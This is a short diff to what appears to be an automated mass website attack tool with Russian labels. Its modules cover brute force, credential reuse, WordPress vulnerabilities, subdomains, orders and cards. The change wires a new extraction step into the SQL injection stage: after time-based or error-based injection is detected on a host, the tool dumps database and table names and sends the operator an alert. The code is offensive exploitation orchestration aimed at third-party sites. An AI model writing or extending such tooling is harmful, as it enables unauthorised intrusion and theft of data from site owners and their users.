@@ -1,4 +1,4 @@
-# -*- coding: utf-8 -*-
+﻿# -*- coding: utf-8 -*-
 import contextlib
 import csv
 import io as sio
@@ -12,7 +12,7 @@ from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
 
 from core import browser, config, hints, http, notify, queue, ui, waf
 from core import card
-from modules import admin, arch, brute, engine, files, keep, mass, orders, reuse, sqli, subdom, tpl, wp, wpfast, wpvuln
+from modules import admin, arch, brute, engine, extract, files, keep, mass, orders, reuse, sqli, subdom, tpl, wp, wpfast, wpvuln
 from modules import creds as credmod
 
 _REAL = sys.stdout
@@ -291,9 +291,17 @@ def _work(host, st, use_browser, full):
 
     if score >= 2 and time.time() - t0 < 400:
         _stage(st, host, "инъекции", rec)
-        out = _call(sqli.run, 180, host, kind)[0]
+        out, sq, _e = _call(sqli.run, 180, host, kind)
         if "ВРЕМЕННАЯ" in out or "ОШИБКА SQL" in out:
             rec["notes"].append("sqli")
+            if sq:
+                _stage(st, host, "разработка", rec)
+                ex = _call(extract.run, 420 if full else 120, host, sq, full)[1] or []
+                if ex:
+                    rec["notes"].append("вывод: %d" % len(ex))
+                    loud = [f for f in ex if f["tag"] in ("extract:база", "extract:таблицы")]
+                    if loud:
+                        notify.send("ИНЪЕКЦИЯ\n%s\n%s" % (host, loud[0]["extra"]))
 
     if score >= 4 and time.time() - t0 < 400:
         _stage(st, host, "архивы", rec)
